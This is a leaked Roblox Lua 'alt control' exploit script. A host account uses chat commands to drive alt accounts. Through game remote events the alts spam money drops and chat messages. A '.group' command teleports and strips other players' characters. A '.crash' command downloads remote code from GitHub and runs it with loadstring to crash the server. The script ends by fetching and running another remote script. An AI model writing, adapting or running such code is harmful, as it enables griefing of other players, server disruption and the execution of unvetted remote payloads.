-- This kid is a scammer, scammed me smh.

getgenv().Settings = {
    Host = {"HostName","HostName2"},
    Prefix = ".",
    FPS_CAP = 3,
}
getgenv().Alts = {
    Alt1 = "Alt1",
    Alt2 = "Alt2",
    Alt2 = "Alt3",
}

-- Released the raw source, enjoy skidders.

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local player = game.Players.LocalPlayer
local isaop = false
getgenv().IncomingSpeicalKey = "AAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCC_sike_kameaweaorjaiwrjaraornaoraorwrarnawrnaowrawornaornawonraornawoirawoiraur349324uinraonr__rwqroubqir"

if table.find(Settings['Host'],player.Name) then
	isaop = true
else
	setfpscap(Settings['FPS_CAP'])

	local AltControl = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	
	AltControl.Name = "AltControl"
	AltControl.Parent = game.CoreGui
	AltControl.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	Frame.Parent = AltControl
	Frame.AnchorPoint = Vector2.new(0.5, 0.5)
	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 100
	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame.Size = UDim2.new(1, 0, 1, 0)
	
	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Position = UDim2.new(0.437655866, 0, 0.380451113, 0)
	TextLabel.Size = UDim2.new(0, 200, 0, 50)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "3D rendering off"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 50.000
	
	TextLabel_2.Parent = Frame
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.Position = UDim2.new(0.437655866, 0, 0.455639064, 0)
	TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
	TextLabel_2.Font = Enum.Font.SourceSans
	TextLabel_2.Text = "Name"
	TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.TextSize = 50.000
	
	local function NHXH_fake_script() -- TextLabel_2.LocalScript 
		local script = Instance.new('LocalScript', TextLabel_2)
	
		script.Parent.Text = game.Players.LocalPlayer.Name
	end
	coroutine.wrap(NHXH_fake_script)()
end

local function NoClip_2(_action_,boolean_value)
	if boolean_value == true then
		if string.lower(_action_) == "float" then
			game.Workspace.Gravity = 0
		end
	end	
end

local Settings_ = {
	OriginalGravity = 196.19999694824,
	Dropping = false,
	Blocking = false,
	LoopMsg = false,
	Floating = false,
	msg_loop = "joe"
}

local function saymsg(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
end

local locations = {
	Bank = {"-388,21,-336","-388,21,-327","-388,21,-318","-388,21,-309","-388,21,-300","-388,21,-291","-388,21,-282","-388,21,-273","-388,21,-264","-388,21,-255","-388,21,-246","-388,21,-237","-388,21,-228","-375,21,-336","-375,21,-327","-375,21,-318","-375,21,-309","-375,21,-300","-375,21,-291","-375,21,-282","-375,21,-273","-375,21,-264","-375,21,-255","-375,21,-246","-375,21,-237","-375,21,-228","-360,21,-336","-360,21,-327","-360,21,-318","-360,21,-309","-360,21,-300","-360,21,-291","-360,21,-282","-360,21,-273","-360,21,-264","-360,21,-255","-360,21,-246","-360,21,-237","-360,21,-228"},
	Court = {"-871,21,-448","-882,21,-448","-893,21,-448","-904,21,-448","-915,21,-448","-926,21,-448","-937,21,-448","-948,21,-448","-959,21,-448","-970,21,-448","-981,21,-448","-992,21,-448","-871,21,-482","-882,21,-482","-893,21,-482","-904,21,-482","-915,21,-482","-926,21,-482","-937,21,-482","-948,21,-482","-959,21,-482","-970,21,-482","-981,21,-482","-992,21,-482","-871,21,-518","-882,21,-518","-893,21,-518","-904,21,-518","-915,21,-518","-926,21,-518","-937,21,-518","-948,21,-518","-959,21,-518","-970,21,-518","-981,21,-518","-992,21,-518","-933,22,-505","-933,22,-459","-896,21,-436"},
	Club = {"-282,-7,-348","-274,-7,-348","-266,-7,-348","-258,-7,-348","-250,-7,-348","-282,-7,-357","-274,-7,-357","-266,-7,-357","-258,-7,-357","-250,-7,-357","-282,-7,-362","-274,-7,-362","-266,-7,-362","-258,-7,-362","-250,-7,-362","-282,-7,-367","-274,-7,-367","-266,-7,-367","-258,-7,-367","-250,-7,-367","-282,-7,-372","-274,-7,-372","-266,-7,-372","-258,-7,-372","-250,-7,-372","-282,-7,-377","-274,-7,-377","-266,-7,-377","-258,-7,-377","-250,-7,-377","-282,-7,-382","-274,-7,-382","-266,-7,-382","-258,-7,-382","-250,-7,-382","-248,0,-342","-260,0,-341","-271,0,-341","-281,0,-341"},
	Admin = {"-826,-40,-617","-826,-40,-605","-826,-40,-593","-826,-40,-581","-826,-40,-569","-826,-40,-557","-845,-40,-617","-845,-40,-605","-845,-40,-593","-845,-40,-581","-845,-40,-569","-845,-40,-557","-864,-40,-617","-864,-40,-605","-864,-40,-593","-864,-40,-581","-864,-40,-569","-864,-40,-557","-879,-40,-617","-879,-40,-605","-879,-40,-593","-879,-40,-581","-879,-40,-569","-879,-40,-557","-898,-40,-617","-898,-40,-605","-898,-40,-593","-898,-40,-581","-898,-40,-569","-898,-40,-557","-918,-40,-617","-918,-40,-605","-918,-40,-593","-918,-40,-581","-918,-40,-569","-918,-40,-557","-816,-33,-643","-927,-33,-642","-873,-33,-521"},
}

game:GetService("RunService").Stepped:Connect(function()
	if Settings_['Dropping'] == true then
		game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
	end
	if Settings_['Blocking'] == true then
		game.ReplicatedStorage.MainEvent:FireServer("Block",true)
	end
	if Settings_['Floating'] == true then
		game.Workspace.Gravity = 0
	end
end)

coroutine.resume(coroutine.create(function()
	while wait(10) do
		if Settings_['LoopMsg'] == true then
			saymsg(Settings_['msg_loop'])
		end
	end
end))

local function cmds(msg,plr)
	if isaop == false or table.find(Settings['Host'],game.Players:GetPlayerByUserId(plr).Name) then
		if msg == Settings['Prefix'].."bring" then
			if not isaop then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.X,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Y,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Z+5)
			end
		elseif msg == Settings['Prefix'].."freeze" then
			if not isaop then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		elseif msg == Settings['Prefix'].."unfreeze" then
			if not isaop then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		elseif msg == Settings['Prefix'].."hide" then
			if not isaop then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y+12,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		elseif msg == Settings['Prefix'].."unhide" then
			if not isaop then
				wait(0.5)
				for i=1,7 do
					wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y+10,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
				end
				for i,v in pairs(workspace:GetChildren()) do
					if v.Name == "1_Part_1" then
						v:Destroy()
					end
				end
			end
		elseif msg == Settings['Prefix'].."drop" then
			if not isaop then
				Settings_['Dropping'] = true
				game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
				Settings_['Blocking'] = true
			end
		elseif msg == Settings['Prefix'].."stop" then
			if not isaop then
				Settings_['Dropping'] = false
				Settings_['Blocking'] = false
				game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
				for i=1,10 do
					game.ReplicatedStorage.MainEvent:FireServer("Block",false)
					wait()
				end
			end
		elseif msg == Settings['Prefix'].."wal" then
			if not isaop then
				game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
			end
		elseif msg == Settings['Prefix'].."unwal" then
			if not isaop then
				game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
			end
		elseif msg == Settings['Prefix'].."block" then
			if not isaop then
				Settings_['Blocking'] = true
			end
		elseif msg == Settings['Prefix'].."unblock" then
			if not isaop then
				Settings_['Blocking'] = false
				for i=1,10 do
					game.ReplicatedStorage.MainEvent:FireServer("Block",false)
					wait()
				end
			end
		elseif msg == Settings['Prefix'].."god" then
			if not isaop then
				if game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild('Attacking') then
					game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild('Attacking'):Destroy()
				end
			end
		elseif msg == Settings['Prefix'].."crash" then
			if not isaop then
				loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
			end
		elseif msg == Settings['Prefix'].."unad" then
			if not isaop then
				Settings_['LoopMsg'] = false
			end
		elseif msg == Settings['Prefix'].."group" then
			if not isaop then
				pcall(function()
					coroutine.resume(coroutine.create(function()
						while wait(0.01) do
							for i,v in pairs(game.Players:GetChildren()) do
								if v.Name ~= game.Players.LocalPlayer.Name then
									v.Character.HumanoidRootPart.CFrame = CFrame.new(274,28,-1084)
								end
							end
						end
					end))
					
					for i,v in pairs(game.Players:GetChildren()) do
						if v.Name ~= game.Players.LocalPlayer.Name then
							for i2,v2 in pairs(v.Character:GetChildren()) do
								if v2:IsA("MeshPart") or v2:IsA("Accessory") or v.Name == "Humanoid" or v.Name == "HumanoidRootPart" then
									v2:Destroy()
								end
							end
						end
					end
				end)
				local newPos = CFrame.new(game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.X-5,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Y,game.Players:GetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Z+5)
				local ch = math.random(4,6)
				for i=1,10 do
					player.Character.HumanoidRootPart.CFrame = newPos
					if i == ch then
						player.Character.HumanoidRootPart.Anchored = true
					end
					wait()
				end
			end
		elseif msg == Settings['Prefix'].."ungroup" then
			if not isaop then
				for i=1,10 do
					player.Character.HumanoidRootPart.Anchored = false
					wait()
				end
			end
		elseif msg == Settings['Prefix'].."float" then
			if not isaop then
				Settings_['Floating'] = true
				local newPos = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y+10,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
				setfpscap(30)
				for i=1,10 do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = newPos
					wait()
				end
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				setfpscap(Settings['FPS_CAP'])
				for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
					if v:IsA("AnimationTrack") and v.Name == "FallAnim" then
						v:Destroy()
					end
				end
			end
		elseif msg == Settings['Prefix'].."unfloat" then
			if not isaop then
				Settings_['Floating'] = false
				for i=1,10 do
					player.Character.HumanoidRootPart.Anchored = false
					wait()
				end
				for i,v in pairs(workspace:GetChildren()) do
					if v.Name == "2_Part_2" then
						v:Destroy()
					end
				end
			end
		elseif msg == Settings['Prefix'].."vibe" then
			if not isaop then 
				local AnimationsFolder = Instance.new('Folder', game.Workspace)
				local Dance1ani = Instance.new('Animation', AnimationsFolder)
				Dance1ani.AnimationId = 'rbxassetid://3189773368'
				local Dance1 = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance1ani)
				Dance1:Play()
			end
		elseif msg == Settings['Prefix'].."unvibe" then
			if not isaop then 
				for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
					if v.Name == "Animation" or v.Name == "Animation1" then
						v:Stop()    
					end
				end
			end
		elseif msg == Settings['Prefix'].."reset" then
			if not isaop then 
				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					if v:IsA("MeshPart") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then
						v:Destroy()
					end
				end
			end
		elseif msg == Settings['Prefix'].."mask" then
			if not isaop then 
				local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
				if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
					wait(.2)
					fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
					toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
					toolf.Parent = game.Players.LocalPlayer.Character
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("Mask")
					game:GetService("VirtualUser"):ClickButton1(Vector2.new())
					game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
					game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
				end
			end
		end
		msg = string.split(msg," ")
		if msg[1] and msg[2] then
			if msg[1] == Settings['Prefix'].."say" then
				if not isaop then
					local success, err = pcall(function()
						local final_msg = ""
						local new_msg = {}
						for i,v in pairs(msg) do
							table.insert(new_msg,v)
						end
						
						table.remove(new_msg,1)
						function getTableCnt(_table_)
							local cnt = 0
							for i,v in pairs(_table_) do
								cnt = cnt + 1
							end
							return cnt
						end
						local cnt_ = 0
						for i,v in pairs(new_msg) do
							cnt_ = cnt_ + 1
							if getTableCnt(new_msg) ~= cnt_ then
								final_msg = final_msg..""..v.." "
							else
								final_msg = final_msg..""..v
							end
						end
						saymsg(final_msg)
					end)
				end
			elseif msg[1] == Settings['Prefix'].."ad" then
				if not isaop then
					local success, err = pcall(function()
						local final_msg = ""
						local new_msg = {}
						for i,v in pairs(msg) do
							table.insert(new_msg,v)
						end
						
						table.remove(new_msg,1)
						function getTableCnt(_table_)
							local cnt = 0
							for i,v in pairs(_table_) do
								cnt = cnt + 1
							end
							return cnt
						end
						local cnt_ = 0
						for i,v in pairs(new_msg) do
							cnt_ = cnt_ + 1
							if getTableCnt(new_msg) ~= cnt_ then
								final_msg = final_msg..""..v.." "
							else
								final_msg = final_msg..""..v
							end
						end
						Settings_['LoopMsg'] = true
						Settings_['msg_loop'] = final_msg
					end)
				end
			elseif msg[1] == Settings['Prefix'].."fps" then
				if not isaop then
					setfpscap(tonumber(msg[2]))
				end
			elseif msg[1] == Settings['Prefix'].."setup" then
				if not isaop then
					if player.Character.HumanoidRootPart.Anchored == true then
						player.Character.HumanoidRootPart.Anchored = false
					end
					local function NewList()
						local t = {}
						local function CheckPplr(_name_)
							for i,v in pairs(game.Players:GetChildren()) do
								if v.Name == _name_ then
									return true
								end
							end
							return false
						end
						for i,v in pairs(Alts) do
							if CheckPplr(v) == true then
								table.insert(t,tostring(v))
							end
						end
						return t
					end
					local _cnt_ = 0
					local newTable = NewList()
					local function SetUp(_location_)
						local place = locations[_location_][_cnt_]
						local x,y,z = string.split(place,",")[1],string.split(place,",")[2],string.split(place,",")[3]
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
					end
					local function rotateTable()
						_cnt_ = _cnt_ + 1
					end

					local Locations_ = {
						admin = "Admin",
						court = "Court",
						club = "Club",
						bank = "Bank",
					}
					local area = Locations_[string.lower(msg[2])]

					for i,v in pairs(newTable) do
						if v == player.Name then
							rotateTable()
							SetUp(area)
						else
							rotateTable()
						end
					end
				end
			end
		end
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(Settings['Host'],plr.Name) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)

for item,plr in pairs(game.Players:GetChildren()) do
	if table.find(Settings['Host'],plr.Name) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end
loadstring(game:HttpGet('https://raw.githubusercontent.com/grandpascripts/error502/main/AntiAfk.lua'))()
game.StarterGui:SetCore("SendNotification",{
	Title = "Alt Control!";
	Text = "Executed!";
	Duration = 10;
})
